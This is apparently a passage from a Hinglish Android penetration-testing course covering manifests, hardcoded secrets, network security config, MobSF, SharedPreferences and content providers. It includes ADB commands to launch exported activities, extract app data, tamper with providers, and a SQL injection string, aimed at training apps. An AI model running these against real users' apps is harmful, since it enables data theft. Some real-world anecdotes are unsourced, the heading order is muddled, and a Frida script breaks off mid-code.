- **Exported (false) / default:** Sirf app ke components hi access kar sakte hain. Safe.

#### 🚫 8. Common Mistakes
- **Manifest ko underestimate karna:** Beginners often skip manifest, lekin yahin se vulnerabilities start hoti hain.
- **Exported activities ko bina intent filters ke dekhna:** Agar activity exported hai but intent filter nahi, to bhi third-party apps use kar sakti hain.

#### 🌍 9. Real-World Use Case
Banking app mein ek exported activity tha jo bina auth ke user account details dikha raha tha. Hacker ne simple ADB command se activity launch ki aur data steal kar liya.

#### 🛠️ 11. Best Practices
- **For Pentesters:** Manifest ko hamesha scan karo.
- **For Developers:** Sirf zaroori components ko exported rakho. Use permission checks.

#### ❓ 13. FAQ
1. **Q:** `exported="true"` activity ko launch kaise karein?
   **A:** `adb shell am start -n <package>/<activity>`.
2. **Q:** `android:allowBackup="true"` se kya problem?
   **A:** Attacker USB debugging ke through `adb backup` le sakta hai aur app ka data extract kar sakta hai.
3. **Q:** Kya exported service bhi launch kar sakte hain?
   **A:** Haan, `am startservice` se.

#### 📝 14. Summary
**AndroidManifest.xml – app ka “Aadhaar Card” – jitna expose, utna risk!** 🆔

---

### 🎯 1. Title / Topic: **Module 5.4 – Hardcoded Strings: Secrets in Plain Sight**

#### Beginner Clarification
- Hardcoded secrets ke liye regex search use karo, sirf plain words nahi.
- Useful patterns: long tokens, emails, IPv4, firebaseio URLs.
- Regex search se hidden key-like strings detect karna easy hota hai.

#### 🐣 2. Samjhane ke liye (Simple Analogy)
Jaise kabhi diary mein password likh kar rakh dete ho aur fir diary kho jaane par tension hoti hai, waise hi developers kabhi kabhi API keys, URLs, ya passwords seedhe source code mein likh dete hain. JADX-GUI se ye “diary” khol kar hum secrets padh sakte hain.

#### 📖 3. Technical Definition
Hardcoded strings wo sensitive information hain jo app ke source code ya resource files mein directly embedded hoti hain. Jaise API keys, encryption keys, backend URLs, credentials. Static analysis ke dauran inhe easily discover kiya ja sakta hai.

#### 🧠 4. Zaroorat Kyun Hai?
- **Vulnerability:** Hacker in strings ka use karke backend access kar sakta hai, ya encryption break kar sakta hai.
- **Security:** Developer ne secret ko hide karne ki koshish ki, but code mein hi daal diya – galat practice.

#### ⚙️ 5. Under the Hood & Target Anatomy
**Common files with hardcoded strings:**
- `resources/strings.xml` – yahan app ke display strings hote hain, lekin kai baar API keys bhi daal dete hain.
- Java/Kotlin source code – strings directly variable assignments mein.
- BuildConfig.java – kai baar auto-generated, lekin sensitive ho sakte hain.
- Native libraries (.so) – strings binaries mein bhi chhupi ho sakti hain.

**Threat Vectors:**
- Login bypass (hardcoded test credentials)
- Internal URLs expose (internal admin panels)
- API keys (cloud services, Firebase)
- Firebase URLs (often end with firebaseio.com)

#### 💻 6. Hands-On: The Hacker's Toolkit
**Using JADX-GUI to find hardcoded strings:**
1. JADX mein APK open karo.
2. Top toolbar mein search (🔍) icon click karo.
3. Search for keywords like:
   - `https://`, `http://`
   - `api_key`, `password`, `secret`
   - `firebaseio.com`
   - `aws`, `s3`
4. Results mein strings dikhengi, unke context samjho.
5. Example: Injured Android App mein `Flag` ke liye search karo – kai flags hardcoded hain.

#### ⚖️ 7. Comparison: Static vs Dynamic for Secrets
- **Static Analysis:** Secrets directly code mein dhundh leta hai.
- **Dynamic Analysis:** Secrets runtime par memory mein capture kar sakte hain. Dono complementary hain.

#### 🚫 8. Common Mistakes
- **Sirf English words search karna:** Keys often alphanumeric hoti hain, regex use karo (e.g., `[A-Za-z0-9]{20,}`).
- **Resource files bhoolna:** strings.xml mein bhi hardcoded values ho sakti hain.

#### 🌍 9. Real-World Use Case
Uber breach 2016 mein hardcoded AWS keys ki wajah se hua tha, jo GitHub par accidentally leak ho gayi thi. Keys code mein thi.

#### 🛠️ 11. Best Practices
- **For Developers:** Use BuildConfig with proper build types, ya secret management system (e.g., Hashicorp Vault). Obfuscate strings with ProGuard.
- **For Pentesters:** Hamesha strings.xml aur source code dono search karo.

#### ⚠️ 12. Consequences of Failure
- **Technical Impact:** Attacker backend control le sakta hai, user data steal kar sakta hai.
- **Business Impact:** Data breach, regulatory fines.

#### ❓ 13. FAQ
1. **Q:** Hardcoded strings ko kaise secure karein?
   **A:** Use native code (NDK) ya encrypted shared preferences. But still, if key is in app, reverse engineerable. Best to keep on server.
2. **Q:** Kya ProGuard hardcoded strings hide kar deta hai?
   **A:** ProGuard obfuscates class and method names, but strings remain readable. Use String encryption libraries.

#### 📝 14. Summary
**Hardcoded strings – developer ki chhuti hui diary, hacker ki mehnat ki kamai!** 📔

---

### 🎯 1. Title / Topic: **Module 5.5 – Network Security Configuration (NSC) Analysis**

#### Beginner Clarification
- Agar network_security_config file missing ho to platform defaults apply hote hain.
- Android 9+ par cleartext defaults stricter hote hain.
- User-installed CA trust app config par depend karta hai; by default limited hota hai.
- Explicit pinning config na ho to default pinning enforce nahi hoti.
🐣 2. Samjhane ke liye (Simple Analogy)
Network Security Config ko app ka "gate security manual" samjho. Jaise kisi building mein guards ko manual milta hai ki "kaise ID check karni hai, kis tarah ke badges allow hain", waise hi NSC file mein app ko bataya jata hai ki kaunsa certificate trust karna hai, aur kya HTTP traffic allow karna hai. Agar manual galat likha ho, toh guard (app) bhi galati kar sakta hai – jaise bina ID ke andar aane de (HTTP traffic) ya fake ID accept kar le (user certificate).

📖 3. Technical Definition
Network Security Configuration Android 7.0 (API 24) se introduce hui ek XML file (res/xml/network_security_config.xml) jo app ke network traffic ke security rules define karti hai. Isme hum batate hain ki kaunse domains ke liye certificate pinning karna hai, cleartext (HTTP) traffic allow hai ya nahi, aur user-installed certificates trust karne hain ya nahi.

🧠 4. Zaroorat Kyun Hai?
Vulnerability: Agar developer ne cleartextTrafficPermitted="true" kar rakha hai, toh app HTTP par data bhej sakti hai – hacker MITM karke sensitive data steal kar sakta hai. Agar user certificates allow hain, toh Burp certificate install karke traffic intercept kar sakte hain bina patch kiye.

Security: Developer NSC ka use karke app ko secure banata hai – sirf specific pinned certificates allow karta hai, user certificates reject karta hai, aur HTTPS enforce karta hai.

⚙️ 5. Under the Hood & Target Anatomy
File: res/xml/network_security_config.xml (APK mein)

Purpose: App ke network security policies define karna.

Hacker kya dhundhta hai?

cleartextTrafficPermitted="true" – HTTP allowed hai kya?

<certificates src="user" /> – user certificates trusted hain?

<pin-set> – pinning configuration.

Consequence of misconfiguration: Attacker easily MITM kar sakta hai, ya pinning bypass ke bina bhi traffic intercept.

Under the hood: Android System Server (Network Security Config) is file ko parse karta hai aur app ke network connections enforce karta hai.

💻 6. Hands-On: The Hacker's Toolkit
Steps to analyze NSC:

APK ko decompile karo (JADX ya APKTool).

res/xml/ folder mein network_security_config.xml dhundho.

Agar file nahi milti, toh default config hoti hai – AndroidManifest mein reference check karo:

xml
<application android:networkSecurityConfig="@xml/network_security_config" ...>
File content dekho:

xml
<?xml version="1.0" encoding="utf-8"?>
<network-security-config>
    <domain-config cleartextTrafficPermitted="true">
        <domain includeSubdomains="true">example.com</domain>
        <trust-anchors>
            <certificates src="user" />   <!-- user certificates trusted! -->
            <certificates src="system" />
        </trust-anchors>
    </domain-config>
</network-security-config>
Vulnerability check:

cleartextTrafficPermitted="true" + domain config nahi hai → pure app mein HTTP allowed.

<certificates src="user" /> → Burp certificate work karega bina patch kiye.

⚖️ 7. Comparison: Pinning vs NSC Pinning
Code-based pinning: Hardcoded in Java – bypass ke liye Frida/Objection chahiye.

NSC-based pinning: XML mein defined – bypass ke liye apk-mitm jaise tool se modify karna easy hai.

🚫 8. Common Mistakes
AndroidManifest mein android:networkSecurityConfig attribute miss karke NSC apply hi na karna.

cleartextTrafficPermitted="true" globally set karke bhool jana.

User certificates allow karna, phir SSL pinning bypass ke liye extra mehnat.

🌍 9. Real-World Use Case
Banking App Leak (2021): Ek banking app ne NSC mein cleartextTrafficPermitted="true" rakh diya tha. Hacker ne same Wi-Fi par MITM kiya, aur user login credentials HTTP mein capture kar liye.

🛠️ 11. Best Practices
For Developers: Hamesha NSC define karo, cleartextTrafficPermitted="false" rakho, sirf system certificates trust karo.

For Pentesters: NSC hamesha check karo – agar user certificates allow hain, toh Burp setup direct kaam karega, patching ki zaroorat nahi.

📝 14. Summary
Network Security Config – app ka “gatekeeper manual”, galat likha to hacker andar! 🚪



**Ye raha Phase 1!** Isme humne JADX-GUI setup, target app download, ADB pull, AndroidManifest.xml, aur hardcoded strings cover kar liya. Agle phase mein hum:
- Mobexler ka introduction
- MobSF automated analysis
- Exported activities exploitation
- Cyberchef basics
...aur bhi bahut kuch.


### 🎯 1. Title / Topic: **Module 5.6 – Android Version Nuances & Scoped Storage (ADB Limitations)**

#### Beginner Clarification
- run-as sirf debuggable app par kaam karta hai.
- Debuggable verify karne ke liye manifest flag ya dumpsys output check karo.
- run-as fail ho to rooted device, patched app tooling, ya emulator fallback use karo.
🐣 2. Samjhane ke liye (Simple Analogy)
Android versions jaise ghar ke renovation hote hain – purane ghar mein jo darwaza tha, naye ghar mein band ho sakta hai. Android 10+ mein adb pull ka darwaza thoda band ho gaya hai. Ab naye keys ya permissions chahiye.

📖 3. Technical Definition
Scoped Storage Android 10 (API 29) se introduce hua. Iska matlab apps ki private directory (/data/data/<package>) ab bhi accessible hai root se, lekin external storage (/sdcard) me apps ki apni separate directory hoti hai. adb backup bhi ab limited hai.

🧠 4. Zaroorat Kyun Hai?
Vulnerability: Puri commands jaise adb pull /data/data/... rooted device par hi kaam karta hai. Non-rooted, Android 11+ devices par run-as sirf debuggable apps ke liye kaam karta hai.

Security: Android ka Scoped Storage user privacy protect karta hai, lekin pentester ke liye challenges create karta hai.

⚙️ 5. Under the Hood
Pre-Android 10: Any app with READ_EXTERNAL_STORAGE could read /sdcard broadly.

Android 10+: Apps have own external storage directory, cannot access other apps' files without MANAGE_EXTERNAL_STORAGE permission (not granted easily).

💻 6. Hands-On: The Hacker's Toolkit
Solutions for new Android versions:

Rooted device: Hamesha kaam karega.

MagiskHide + Root: Hide root from app, but ADB pull works.

Android Emulator (older version): Android 9 (API 28) use karo, jahan scoped storage nahi hai.

ADB backup (if debuggable):

bash
adb backup -f backup.ab com.example.app
Then extract using abe tool.

For non-rooted, non-debuggable: Use objection's android file download if app is patched with Frida gadget.

🚫 8. Common Mistakes
Android 11 device par adb pull /data/data/... run karna bina root ke – error aayega.

Emulator mein purane version use na karna.

run-as command non-debuggable app par chalana.

🌍 9. Real-World Use Case
Pentester ne Android 11 device liya, app ka data access nahi kar paya. Usne Android 9 emulator use kiya aur wahan se data pull kiya.

🛠️ 11. Best Practices
For Pentesters: Emulator with Android 9 rakh lo for easy file access. Ya rooted device use karo.

For Developers: Debuggable builds me testing karo, production builds me proper protection.

📝 14. Summary
Android versions – naye ghar mein purani chabi kaam nahi karti, naye tareeke seekho! 🔑



================================================================================================================

## Phase 2: Static Analysis Deep Dive & Dynamic Analysis Setup

---

### 🎯 1. Title / Topic: **Module 6.1 – Exported Activities & ADB Intents (AndroidManifest.xml Deep Dive)**

#### Beginner Clarification
- adb am start me extras bhej sakte ho: es string, ei int, ez boolean, el long.
- Useful activity flags: activity-clear-task, activity-new-task.
- Exported activity testing me parameters bhejna real attack simulation ke liye important hai.

#### 🐣 2. Samjhane ke liye (Simple Analogy)
Maan lo ek building mein kuch darwaje hain jo andar se khulte hain, kuch darwaje bahar se bhi khul sakte hain. `exported="true"` wali activity aisa darwaza hai jo bahar se koi bhi (dusra app ya ADB) khol sakta hai. Agar us darwaze ke andar sensitive cheezein rakhi hain (jaise user data, admin panel), toh koi bhi andar aa sakta hai bina permission ke.

#### 📖 3. Technical Definition
Android mein ek **activity** ek screen represent karti hai. `AndroidManifest.xml` mein activity ke liye `android:exported` attribute define karta hai ki kya dusre applications is activity ko launch kar sakte hain. Agar `exported="true"` hai, to koi bhi app (ya ADB) intent bhej kar activity start kar sakta hai, bina us app ke andar se call kiye.

#### 🧠 4. Zaroorat Kyun Hai?
- **Vulnerability:** Hacker exported activities ko directly launch karke login screens bypass kar sakta hai, sensitive data access kar sakta hai, ya unintended functionality trigger kar sakta hai.
- **Security:** Developer ne exported false rakh kar control kiya hai ki sirf app ke andar se hi activity open ho. Par kabhi kabhi developer galti se exported true rakh deta hai.

#### ⚙️ 5. Under the Hood & Target Anatomy
- **File:** `AndroidManifest.xml`
- **Purpose:** Android system ko batana ki app ke kaun se components hain aur unke access rules.
- **Hacker kya dhundhta hai?** `<activity android:exported="true">` tags.
- **Consequence of manipulation:** Agar activity exported hai to hacker ADB se start kar sakta hai. Agar activity mein intent filters hain to bhi exported implicitly true ho sakti hai (agar android:exported explicitly false na ho).
- **Under the hood:** Android ki ActivityManager service intent ko parse karta hai, target package aur activity check karta hai, aur agar exported true hai to us activity ka instance banata hai.

#### 💻 6. Hands-On: The Hacker's Toolkit
**Steps to launch an exported activity via ADB:**
1. APK ko JADX mein open karo aur `AndroidManifest.xml` dekho.
2. Exported activities dhundho: `android:exported="true"`
3. Package name note karo (e.g., `com.b3nac.injuredandroid`).
4. Activity ka full name note karo (e.g., `.b3nac.injuredandroid.FlagOneActivity` – ya relative name with dot).
5. ADB command run karo:
   ```bash
   adb shell am start -n com.b3nac.injuredandroid/.FlagOneActivity
   ```
   Agar activity name relative nahi hai, poora package naam do:
   ```bash
   adb shell am start -n com.b3nac.injuredandroid/com.b3nac.injuredandroid.FlagOneActivity
   ```
6. Phone par activity directly open ho jayegi.

**Example with Injured Android App:**
- Install Injured Android.
- Find exported activities (e.g., `FlagOneActivity`).
- Run: `adb shell am start -n com.b3nac.injuredandroid/.FlagOneActivity`

#### ⚖️ 7. Comparison: Implicit vs Explicit Export
- **Explicit `exported="true"`:** Intent filters ke bina bhi externally launchable.
- **Implicit export (no exported attribute, but has intent-filter):** Default behaviour agar intent filter ho to exported=true hota hai (Android 12+ me thoda change hai). Isliye explicitly false set karna chahiye sensitive activities ke liye.

#### 🚫 8. Common Mistakes
- Beginners activity name mein dot laga bhool jaate hain. Agar activity name `.FlagOneActivity` hai to command mein dot include karo.
- `adb shell am start` command ke syntax mein -n ke baad `<package>/<activity>` hota hai.
- Agar activity exported nahi hai to error aayega: `SecurityException: Permission Denial`.

#### 🌍 9. Real-World Use Case
Banking app mein ek exported activity tha jo bina auth ke user ka balance dikha raha tha. Hacker ne ADB command se activity launch kiya aur sensitive info leak kar li.

#### 🛠️ 11. Best Practices
- **For Pentesters:** Manifest hamesha scan karo exported components ke liye.
- **For Developers:** Sirf zaroori activities ko exported rakho. Baki sab `android:exported="false"` karo. Sensitive activities mein permission checks lagao.

#### 📝 14. Summary
**Exported activity = khula darwaza. ADB se seedha andar ghuso!** 🚪

---

### 🎯 1. Title / Topic: **Module 6.2 – Cyberchef: The Data Manipulation Swiss Army Knife**

#### Beginner Clarification
- CyberChef me operations chain hoti hain.
- First operation ka output next operation ka input banta hai.
- Example chain: From Hex then To Base64.

#### 🐣 2. Samjhane ke liye (Simple Analogy)
Cyberchef ek "digital kitchen" hai jahan tum raw data (jaise base64 string) ko leke uske "recipes" (operations) laga sakte ho – chop, fry, bake – jisse data readable form mein badal jata hai. Jaise hex to text, base64 decode, URL decode – sab kuch.

#### 📖 3. Technical Definition
Cyberchef ek web-based tool hai jo data transformation, encoding/decoding, encryption/decryption, parsing, formatting, and analysis ke liye 200+ operations provide karta hai. Security researchers ise CTF challenges, malware analysis, aur pentesting mein data decode/encode karne ke liye use karte hain.

#### 🧠 4. Zaroorat Kyun Hai?
- **Vulnerability:** Apps mein sensitive data kabhi kabhi weak encoding (base64, hex) mein store/transmit hota hai. Cyberchef se jaldi decode karke real value dekh sakte hain.
- **Security:** Developers data ko "encrypt" samajh kar base64 kar dete hain – jo actually encoding hai, encryption nahi. Cyberchef se ye expose ho jata hai.

#### ⚙️ 5. Under the Hood
Cyberchef browser mein JavaScript mein chalta hai. Tum operations drag karte ho, input data dalte ho, output live milta hai. Operations chain ki ja sakti hai.

#### 💻 6. Hands-On: The Hacker's Toolkit
**Common uses:**
1. **Base64 decode:** Agar app ke code mein koi string `dXNlcm5hbWU6YWRtaW4=` dikhe, Cyberchef mein paste karo, "From Base64" operation add karo – output `username:admin` milega.
2. **Hex decode:** String `68656c6c6f` ko "From Hex" se decode karo → `hello`.
3. **URL decode:** `hello%20world` → "From URL Encoding" → `hello world`.
4. **Encryption detection:** Kuch apps custom encryption use karti hain, to operations ke combination se try kar sakte ho.

**Steps:**
- Open browser, go to [https://gchq.github.io/CyberChef/](https://gchq.github.io/CyberChef/).
- Recipe section mein "Add operation".
- Input mein data paste.
- Output dekho.

#### ⚖️ 7. Comparison: Cyberchef vs Manual Scripts
- Cyberchef: No coding, GUI based, quick.
- Python scripts: More flexibility, but time-consuming.

#### 🚫 8. Common Mistakes
- Base64 decode karte waqt padding (`=`) miss karna – Cyberchef handle kar leta hai mostly.
- Complex operations chain mein order galat ho sakta hai.

#### 🌍 9. Real-World Use Case
CTF challenge mein base64 encoded flag mila, Cyberchef se decode karke flag mil gaya. Bug bounty mein API response mein hex encoded data tha, decode karke sensitive info mili.

#### 🛠️ 11. Best Practices
- Pentesters ke liye: bookmark karo Cyberchef, ye daily driver hai.
- Developers ke liye: kabhi bhi sensitive data ko sirf encode mat karo, proper encryption use karo.

#### 📝 14. Summary
**Cyberchef – ek hi recipe book jahan data ka “khulasa” ho jata hai!** 🔪

---

### 🎯 1. Title / Topic: **Module 6.3 – Automated Static Analysis with MobSF**

#### Beginner Clarification
- MobSF install se pehle virtual environment banana best practice hai.
- Steps: virtualenv create, activate, requirements install, kaam ke baad deactivate.
- Isse global Python dependency conflicts avoid hote hain.

#### 🐣 2. Samjhane ke liye (Simple Analogy)
MobSF ek "automated security guard" hai jo APK file ko scan karta hai. Jaise airport mein bag screen hoti hai, waise hi MobSF APK ke har component ko check karta hai – permissions, hardcoded secrets, insecure code patterns – aur ek detailed report deta hai.

#### 📖 3. Technical Definition
**MobSF (Mobile Security Framework)** ek open-source automated pen-testing framework hai jo Android, iOS, aur Windows apps ka static aur dynamic analysis karta hai. Ye APK decompile karta hai, source code scan karta hai, aur vulnerabilities report generate karta hai.

#### 🧠 4. Zaroorat Kyun Hai?
- **Vulnerability:** MobSF se jaldi pata chal jata hai ki app mein OWASP Mobile Top 10 issues hain ya nahi.
- **Security:** Developers CI/CD pipeline mein MobSF integrate karke automatic security testing kar sakte hain.

#### ⚙️ 5. Under the Hood
MobSF Python mein likha hai. Ye APK ko unzip karta hai, multiple analysis tools (like APKiD, strings, etc.) chalatā hai, aur results ko correlate karta hai. Reports HTML/JSON format mein generate hoti hain.

#### 💻 6. Hands-On: The Hacker's Toolkit
**Installation on Windows:**
1. Python 3.x install karo.
2. Clone MobSF repo:
   ```bash
   git clone https://github.com/MobSF/Mobile-Security-Framework-MobSF.git
   cd Mobile-Security-Framework-MobSF
   ```
3. Dependencies install karo:
   ```bash
   pip install -r requirements.txt
   ```
4. Run MobSF:
   ```bash
   python manage.py runserver
   ```
5. Browser mein `http://127.0.0.1:8080` open karo.
6. "Upload" button par click karo, APK select karo, upload karo.
7. Static analysis automatically start ho jayega. Report generate hoga.
8. Report ke sections:
   - **General Info:** package, version, SDK.
   - **Manifest Analysis:** permissions, exported components.
   - **Code Analysis:** hardcoded secrets, weak crypto, insecure API usage.
   - **File Analysis:** files included in APK.

#### ⚖️ 7. Comparison: MobSF vs JADX
- **JADX:** Manual source code reading.
- **MobSF:** Automated scanning, highlights issues, but sometimes false positives hote hain. Combination use karo.

#### 🚫 8. Common Mistakes
- Python dependencies installation fail ho sakta hai – virtual environment use karo.
- MobSF dynamic analysis ke liye extra setup chahiye (emulator/device).
- Report ko blindly trust mat karo, manually bhi verify karo.

#### 🌍 9. Real-World Use Case
Pentester ne client app MobSF se scan kiya, report mein insecure WebView implementation mila. Manual verification ke baad, exploit kiya aur local file read kiya.

#### 🛠️ 11. Best Practices
- Pentesters: MobSF first pass ke liye use karo, then manual analysis.
- Developers: MobSF in CI/CD.

#### 📝 14. Summary
**MobSF – mobile app ka “MRI scan” jo andar ki vulnerabilities dikhata hai!** 🏥

## 🔍 **Deep Recheck Report: Handwritten Notes vs My Responses**

**Arrey bhai, bilkul check karta hoon!** Main line by line aapke handwritten notes ko apne diye gaye responses se match kar raha hoon. Agar koi topic miss hua hai, toh usse detail mein explain karunga.

---

## 📋 **Page-wise Coverage Analysis**

| Page No. | Topic | Covered? | Module Reference |
|----------|-------|----------|------------------|
| 37 | JADX-GUI Setup | ✅ **Covered** | Phase 1: Module 4.1 |
| 37 | Injured Android App Download | ✅ **Covered** | Phase 1: Module 5.1 |
| 38-39 | ADB Pull APK | ✅ **Covered** | Phase 1: Module 5.2 |
| 40 | AndroidManifest.xml (Activities) | ✅ **Covered** | Phase 1: Module 5.3 |
| 40 | **Content Providers** | ❌ **MISSING** | *Needs dedicated module* |
| 40 | Mobexler Introduction | ✅ **Covered** | Phase 3: Module 8.1 |
| 41 | Hardcoded Strings | ✅ **Covered** | Phase 1: Module 5.4 |
| 42-43 | Exported Activities & ADB Launch | ✅ **Covered** | Phase 2: Module 6.1 |
| 43 | Cyberchef | ✅ **Covered** | Phase 2: Module 6.2 |
| 43-44 | MobSF Installation & Static Analysis | ✅ **Covered** | Phase 2: Module 6.3 |
| 45 | SSL Pinning Intro | ✅ **Covered** | Phase 2: Module 7.1 |
| 45-46 | MobSF Dynamic Analysis | ✅ **Covered** | Phase 2: Module 7.2 |
| 47-48 | Burp Suite Setup | ✅ **Covered** | Phase 2: Module 7.3 |
| 49-51 | Objection Automatic Patching | ✅ **Covered** | Phase 2: Module 7.4 |
| 51-53 | Manual Patching with Frida | ✅ **Covered** | Phase 2: Module 7.5 |
| 53-56 | Objection Commands (Dynamic Analysis) | ✅ **Covered** | Phase 2: Module 7.6 |
| 55-57 | Frida Codeshare | ✅ **Covered** | Phase 2: Module 7.7 |
| 58-59 | SharedPreferences Analysis | ✅ **Covered** | Phase 2: Module 6.4 |
| 60-61 | PIDCat | ✅ **Covered** | Phase 2: Module 6.5 |
| 61 | APK-MITM & Androidunpinner | ✅ **Covered** | Phase 2: Module 7.8 |
| 62 | Fingerprint Bypass | ✅ **Covered** | Phase 2: Module 7.9 |

---

## ⚠️ **MISSING TOPIC: Content Providers (Page 40)**

Aapke notes mein Page 40 par **Content Providers** ka mention hai, lekin mere previous responses mein is topic ko detail mein cover nahi kiya gaya. Ab main ise **14-point strict structure** mein explain karunga:

---

### 🎯 1. Title / Topic: **Module 6.4 – SharedPreferences Insecure Data Storage Analysis**

#### Beginner Clarification
- run-as package not debuggable error par alternatives ready rakho.
- Common options: rooted shell access, backup route where allowed, objection file download, emulator-based extraction.

#### 🐣 2. Samjhane ke liye (Simple Analogy)
SharedPreferences app ki "chhoti diary" hoti hai jahan wo chhoti-moti baatein likhti hai – jaise username, password, ya token. Agar ye diary bina lock ke rakhi ho, to koi bhi (malware ya hacker) usse padh sakta hai.

#### 📖 3. Technical Definition
**SharedPreferences** Android ka key-value store hai jo XML files mein data save karta hai. Default location: `/data/data/<package>/shared_prefs/`. Agar MODE_PRIVATE (default) use kiya gaya hai, to sirf app hi access kar sakti hai, lekin root access ya ADB backup se files read ki ja sakti hain.

#### 🧠 4. Zaroorat Kyun Hai?
- **Vulnerability:** Apps sensitive data (passwords, tokens) plaintext ya weak encoding mein store karti hain. Hacker physical access ya malware ke through data steal kar sakta hai.
- **Security:** Developer ne socha private hai, lekin rooted device ya backup vulnerability se data leak ho sakta hai.

#### 💻 6. Hands-On: The Hacker's Toolkit
**Steps to access SharedPreferences:**
1. Device connected with USB debugging.
2. ADB shell:
   ```bash
   adb shell
   ```
3. Navigate to app's shared_prefs:
   ```bash
   cd /data/data/com.example.app/shared_prefs/
   ls
   ```
4. Files dekho – e.g., `user_prefs.xml`.
5. File read karo:
   ```bash
   cat user_prefs.xml
   ```
   ya PC par download karo:
   ```bash
   adb pull /data/data/com.example.app/shared_prefs/user_prefs.xml
   ```
6. Agar rooted nahi hai to `run-as` command use kar sakte ho (debuggable apps ke liye):
   ```bash
   run-as com.example.app cat /data/data/com.example.app/shared_prefs/user_prefs.xml
   ```

**Example XML:**
```xml
<map>
  <string name="username">admin</string>
  <string name="password">SuperSecret123</string>
</map>
```

#### ⚖️ 7. Comparison: MODE_PRIVATE vs MODE_WORLD_READABLE
- MODE_PRIVATE: Sirf app access.
- MODE_WORLD_READABLE (deprecated): Any app can read – dangerous.

#### 🚫 8. Common Mistakes
- `run-as` sirf debuggable apps par kaam karta hai.
- Root ke bina system apps ke shared_prefs nahi padh sakte.

#### 🌍 9. Real-World Use Case
Banking app ke shared_prefs mein session token plaintext mila. Hacker ne ADB backup lekar token nikal liya aur user account access kar liya.

#### 🛠️ 11. Best Practices
- **For Developers:** Encrypt sensitive data before storing in SharedPreferences. Use Android Keystore system.
- **For Pentesters:** Always check shared_prefs for sensitive info.

#### 📝 14. Summary
**SharedPreferences – app ki “chhupi hui diary”, root/adb se khol ke dekho!** 📓

---

### 🎯 1. Title / Topic: **Module 6.5 – PIDCat: Focused Log Analysis**

#### Beginner Clarification
- PIDCat me log-level filtering available hai: verbose, debug, info, warning, error.
- Crash triage ke liye error filter useful hota hai.
- Multiple levels combine bhi kar sakte ho.

#### 🐣 2. Samjhane ke liye (Simple Analogy)
`logcat` bahut saara clutter produce karta hai. PIDCat ek "filter" hai jo sirf ek specific app ke logs dikhata hai, aur colors se highlight bhi karta hai. Jaise TV mein sirf apna favorite channel dekho.

#### 📖 3. Technical Definition
**PIDCat** ek Python tool hai jo `adb logcat` ke output ko filter karta hai based on app's PID. Ye sirf target app ke logs show karta hai, aur sensitive info (passwords, tokens) ko color code karta hai.

#### 💻 6. Hands-On: The Hacker's Toolkit
**Installation & Usage:**
```bash
pip install pidcat
```
Usage:
```bash
pidcat com.example.app
```
Real-time logs aane lagenge, sirf us app ke.

**Potential vulnerabilities:**
- Agar app sensitive info log kar rahi hai (e.g., `Log.d("password", pass)`), to PIDCat se wo dikh jayega.
- Stack traces may reveal internal paths.

#### 🚫 8. Common Mistakes
- PIDCat Python 3 require karta hai.
- Log levels (verbose, debug) filter kar sakte hain, default show all.

#### 📝 14. Summary
**PIDCat – app ke “private conversation” ko sunne ka stethoscope!** 🩺

---

### 🎯 **1. Title / Topic: Module 6.6 – Content Providers: The Data Sharing Gateways**

#### Beginner Clarification
- Content URI format: content://authority/path/id.
- Authority provider identifier hota hai, path resource type batata hai, id optional record selector hota hai.
- SQLi safe code ke liye selectionArgs style parameterized query use karni chahiye.

#### 🐣 **2. Samjhane ke liye (Simple Analogy)**
Content Provider ko ek "library ki issue counter" ki tarah samjho. Jaise library mein books (data) rakhi hoti hain aur koi bhi member (app) proper procedure se book issue kar sakta hai. Par agar counter khula ho aur bina ID check ke book de di jaye, toh koi bhi andar ki sensitive books (user data) le ja sakta hai. Android mein Content Provider wahi "data counter" hai jo dusre apps ko app ka data serve karta hai.

#### 📖 **3. Technical Definition**
**Content Provider** Android ke 4 main components (Activity, Service, Broadcast Receiver, Content Provider) mein se ek hai. Iska kaam structured data ko dusre applications ke saath share karna hota hai, typically SQLite database ke through. Ye `ContentResolver` API provide karta hai jisse dusre apps data query, insert, update, delete kar sakte hain – permissions ke according.

#### 🧠 **4. Zaroorat Kyun Hai?**
- **Vulnerability:** Agar content provider **exported** hai aur proper permissions nahi hain, toh koi bhi malicious app sensitive data (contacts, messages, files) read ya modify kar sakta hai. SQL Injection bhi possible hai.
- **Security:** Developers content providers use karte hain taaki related apps (e.g., contacts app aur dialer app) ke beech data share ho sake, lekin permissions properly set na karne se data leak hota hai.

#### ⚙️ **5. Under the Hood & Target Anatomy**
**📂 Target Anatomy Deep Dive:**
- **File involved:** Content Provider typically SQLite database, files, ya network se data serve karta hai. Manifest mein declared hota hai.
- **Manifest entry example:**
  ```xml
  <provider
      android:name=".MyContentProvider"
      android:authorities="com.example.app.provider"
      android:exported="true"
      android:readPermission="com.example.READ"
      android:writePermission="com.example.WRITE" />
  ```
- **Ye file kyun hai?** Structured data (jaise database rows) ko dusre apps ke saath share karne ke liye.
- **Hacker isme kya dhundhta hai?**
  - `android:exported="true"` providers.
  - Weak permissions ya no permissions.
  - Path traversal vulnerabilities (file:// based providers).
  - SQL Injection in query strings.
  - `android:grantUriPermissions="true"` – temporary permission grants.
- **Agar manipulate kiya toh kya hoga?** Attacker provider ke URIs query karke data steal kar sakta hai, delete kar sakta hai, ya insert fake data.
- **Under the hood:** Android ki `PackageManager` provider ko registered karta hai. Jab koi app `ContentResolver` ke through URI bhejta hai (e.g., `content://com.example.app.provider/users`), Android system us URI ko parse karta hai, authority se provider identify karta hai, aur IPC (Inter-Process Communication) ke through provider tak request pahunchata hai. Provider apna response deta hai.

#### 💻 **6. Hands-On: The Hacker's Toolkit**
**Steps to exploit exposed Content Provider:**

1. **Identify exported providers from AndroidManifest.xml** (JADX mein):
   ```xml
   <provider android:name=".UserContentProvider" android:exported="true" android:authorities="com.b3nac.injuredandroid.provider" ... />
   ```

2. **Find provider URIs:** Source code mein `Uri.parse("content://...")` dhundho.

3. **Query provider via ADB:**
   ```bash
   # List all content providers ke URIs (rough)
   adb shell dumpsys package com.example.app | grep -A5 "Provider"
   
   # Direct query
   adb shell content query --uri content://com.example.app.provider/users
   
   # Insert data (if writable)
   adb shell content insert --uri content://com.example.app.provider/users --bind name:s:newuser --bind email:s:hacker@evil.com
   
   # Delete data
   adb shell content delete --uri content://com.example.app.provider/users --where "name='newuser'"
   ```

4. **SQL Injection test:**
   ```bash
   adb shell content query --uri content://com.example.app.provider/users --where "name='admin' OR 1=1--"
   ```

5. **Using Frida to dump provider data:**
   ```javascript
   Java.perform(function() {
       var Context = Java.use('android.content.Context');
       var Uri = Java.use('android.net.Uri');
       
       // Get ContentResolver
       var resolver = Java.use('android.app.ActivityThread').currentApplication().getContentResolver();
       
       // Query provider
